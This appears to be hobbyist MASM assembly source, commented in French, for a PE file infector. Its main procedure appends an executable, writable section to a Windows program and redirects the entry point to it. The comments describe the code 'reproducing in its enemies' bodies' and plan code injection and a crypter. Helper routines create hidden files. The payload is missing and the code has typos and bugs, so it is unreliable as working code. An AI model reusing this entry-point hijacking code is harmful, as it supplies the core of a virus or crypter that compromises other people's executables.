            ;procédure pour ajouter une section
            ;le bombyx se reproduit dans le corps de ses ennemis

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

AjoutSection    proc uses esi edi                   ;ils vont servir de marque-page pour
                                                    ;certains "chapitres" des headers.

    ;on suppose que la data pMapping est le handle récupéré après le mapping de l'exe
    ;on suppose aussi la déclaration antérieure des data comme ImageBase, AdressOfEntryPoint,
    ;NumbersOfSections, etc. 


    mov edi, pMapping
    assume edi: ptr IMAGE_DOS_HEADER                ;assume permet d'associer un registre à
                                                    ;une structure, ce qui permet d'accéder à ses
                                                    ;membres données plus facilement
                                                    ;c'est l'équivalent des classes en c++
    add edi, [edi].e_lfanew
    assume edi: ptr IMAGE_NT_HEADERS

    mov eax, [edi].OptionalHeader.ImageBase
    mov ImageBase, eax

    mov eax, [edi].OptionalHeader.AdressOfEntryPoint
    mov AdressOfEntryPoint, eax

    movzx eax, [edi].FileHeader.NumberOfSections    ;c'est la proc qui indique au loader
    mov NumberOfSections, eax                       ;que ta section existe
    inc NumberOfSections                            ;mais ça n'ajoute pas à proprement parler
    mov eax, NumberOfSections                       ;ta section,pour ça il faut son adresse
    mov [edi].FileHeader.NumberOfSections, ax       ;et la remplir avec ton code.

    mov eax, [edi].OptionalHeader.SectionAlignment
    mov SectionAlignment, eax

    mov eax, [edi].OptionalHeader.FileAlignment
    mov FileAlignment, eax

    mov esi, edi
    assume esi: ptr IMAGE_NT_HEADERS

    add edi, sizeof IMAGE_NT_HEADERS
    assume edi: ptr IMAGE_SECTION_HEADER
    push edi                                        ;sauvegarde pour la suite de l'adresse de 
                                                    ;la première table des sections

    mov eax, NumberOfSections
    sub eax, 2
    mov ebx, sizeof IMAGE_SECTION_HEADER
    mul ebx
    add edi, eax                                    ;on ajoute eax (la taille de toutes les 
                                                    ;sections - 2) à edi (début des sections)
                                                    ;pour atterrir sur la dernière section (en
                                                    ;fait, sur l'avant-dernière, mais la dernière
                                                    ;est nulle).
    mov eax, [edi].VirtualAdress
    mov VirtualAdress, eax

    mov eax, [edi].VirtualSize
    mov VirtualSize, eax

    mov eax, [edi].PointerToRawData
    mov PointerToRawData, eax

    mov eax, [edi].SizeOfRawData
    mov SizeOfRawData, eax

    add edi, sizeof IMAGE_SECTION_HEADER

    mov eax, VirtualAdress                	  ;ici on va chercher l'adresse à laquelle doit             
    mov ebx, VirtualSize               	 	  ;commencer la section qu'on ajoute
    add ebx, eax                       	    	  ;elle se trouve juste après la dernière section
    .WHILE eax<ebx                          
        add eax, SectionAlignment
    .ENDW
    mov [edi].VirtualAdress, eax
    mov VirtualAdress, eax                 	  ;voilà l'adresse de notre section (en mémoire!)

    mov eax, PointerToRawData
    mov ebx, SizeOfRawData
    add ebx, eax
    .WHILE eax<ebx
        add eax, FileAlignment
    .ENDW
    mov [edi].PointerToRawData, eax
    mov PointerToRawData, eax                     ;voilà l'adresse de notre section (en dur!)

    mov edx, 1000h                                ;pourquoi 1000h ?

    xor eax, eax
    .WHILE eax < edx
        add eax, FileAlignment
    .ENDW
    mov [edi].SizeOfRawData, eax
    mov SizeOfRawData, eax
    mov [edi].Misc.VirtualSize, eax
    mov edx, [edi].OptionalHeader.SizeOfImage
    add edx, eax
    mov [edi].OptionalHeader.SizeOfImage, edx

    mov [edi].Characteristics, 0E0000060h

    mov dword ptr [edi], "xxx"             	;"xxx" est le nom de la nouvelle section
                                          	;si la taille est > DWORD, il faut en faire plusieurs.

    invoke UnmapViewOfFile, pMapping
    invoke CloseHandle, hMapping
    
    mov eax, PointertoRawData
    add eax, SizeOfRawData                      ;eax=la taille du fichier avec notre code ajouté
    
    invoke CreateFileMapping, hFile, NULL, PAGE_READWRITE, 0, eax, 0
    mov hMapping, eax
    invoke MapViewOfFile, hMapping, FILE_MAP_WRITE, 0, 0, 0
    mov pMapping, eax
    push edi
    invoke RVAToOffset, pMapping, [edi].VirtualAdress
    add eax, pMapping
    mov edx, SizeOfRawData
    .WHILE edx > 0
        mov byte ptr [eax+edx-1], 00h           ;padding de la section pour que les modifications soient prises 						;en compte
        dec edx
    .ENDW

    pop edi

    invoke RVAToOffset, pMapping, [edi].VirtualAdress
    add eax, pMapping
    mov ebx, eax

    mov edi, pMapping
    assume edi:ptr IMAGE_DOS_HEADER
    add edi, [edi].e_lfanew
    assume edi:ptr IMAGE_NT_HEADERS
    mov eax, VirtualAdress
    mov [edi].OptionalHeader.AdressOfEntryPoint, eax        ;EntryPoint modifié, pointe maintenant sur le début 
                                                            ;de la nouvelle section
    push eax                                                

    add edi, sizeof IMAGE_NT_HEADERS                            
    assume edi:ptr IMAGE_SECTION_HEADER
    xor eax, eax
    .WHILE eax<AdressOfEntryPoint
        add edi, sizeof IMAGE_SECTION_HEADER
        mov eax, [edi].VirtualAdress
    .ENDW
    sub edi, sizeof IMAGE_SECTION_HEADER
    
    mov eax, [edi].VirtualAdress
    mov VirtualAdressCode, eax
    
    mov eax, [edi].SizeOfRawData
    mov SizeOfRawDataCode, eax
    
    mov eax, [edi].PointerToRawData
    mov PointerToRawDataCode, eax

    mov [edi].Characteristics, 0E0000060h

    pop eax
    mov eax, ebx

    ret

AjoutSection endp



;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;   il faut include cette fonction   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

RVAToOffset proc uses edi esi edx ecx pFileMap:DWORD, RVA:DWORD             ;RVA est une adresse qui vient du PE-header
                                                                            ; et pFileMap pointe sur le début du prog loadé

    mov esi, pFileMap
    assume esi:ptr IMAGE_DOS_HEADER                             ;toujours pareil, on se déplace dans les header avec assume
    add esi, [esi].e_lfanew                                    
    assume esi:ptr IMAGE_NT_HEADERS                             ;on avance de structure en structure..
    mov edi, RVA
    mov edx, esi
    add edx, sizeof IMAGE_NT_HEADERS
    mov cx, [esi].FileHeader.NumberOfSections                   
    movzx ecx, cx
    assume edx:ptr IMAGE_SECTION_HEADER
    .WHILE ecx>0                                                ;tant qu'il y a une section...
        .IF edi>=[edx].VirtualAdress                            ;si la RVA est plus loin que le début de la section..
            mov eax, [edx].VirtualAdress
            add eax, [edx].SizeOfRawData                        ;et si elle est moins loin que la fin de la section..
            .IF edi<eax
                mov eax, [edx].VirtualAdress
                sub edi, eax                                    ;il ne reste que le décalage
                mov eax, [edx].PointerToRawData                 ;qu'on ajoute au début du RawData (data en dur)
                add eax, edi                                    ;et on obtient l'offset dans le fichier

                ret
            .ENDIF
        .ENDIF
        add edx, sizeof IMAGE_SECTION_HEADER
        dec ecx
    .ENDW
    assume esi:nothing
    assume edx:nothing
    mov eax, edi
ret
RVAToOffset endp

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;; fin de la fonction ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
                
    
;Si il reste des trucs que tu as pas compris mail moi (à part le coup du 1000h, il s'agit sans doute d'une constante dans
;le PE header..
;Il reste à modifier le remplissage de la section avec notre code (là où il remplit de 00h)
;pour ça, ouvrir le fichier, tout lire, récupérer la taille de ce qui est lu, faire un writeprocessmemory avec comme 
;paramètre la taille, coller le code dans la nouvelle section, fermer les handle/instance.

;et l'interface graphique évidemment aha


;je pense qu'on devrait faire un crypteur avec
;en utilisant le truc md5 dont je t'ai parlé et que j'ai trouvé finalement
;ça servirait à protéger des exe, quels qu'ils soient
;guntz te ferait un bisou je pense

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;   Procédure d'ouverture de fichier  ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

OUVRIRFICHIER PROC 
push eax
mov ofs.cBytes,SIZEOF OFSTRUCT
mov ofs.szPathName, OFS_MAXPATHNAME
invoke OpenFile, offset nom_du_fichier, offset ofs, OF_READWRITE 		;ouvre le fichier
mov hFichier, eax								;renvoie le handle du fichier 
pop eax		  		
ret
OUVRIRFICHIER ENDP


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;   Procédure de création de fichier  ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

CREERFICHIER PROC
push eax
invoke CreateFile,ADDR nom_du_fichier,\
                  GENERIC_READ or GENERIC_WRITE ,\		 
                  FILE_SHARE_READ or FILE_SHARE_WRITE,\ 	 
                  NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_HIDDEN,\	 
		  NULL
mov hFichier, eax

;;;et pour écrire dedans:

invoke WriteFile, hFichier, addr data0?, X, addr data1?, NULL	 ;écrit data0? dans le fichier, X octets à la	
pop eax			  				 	 ;fois
ret									
CREERFICHIER ENDP

tip: pour attribuer l'opérateur addr à un paramètre d'une fonction, il faut avoir déclaré le prototype de la fonction au préalable. Utile pour les string[] .data?





































    
    










    





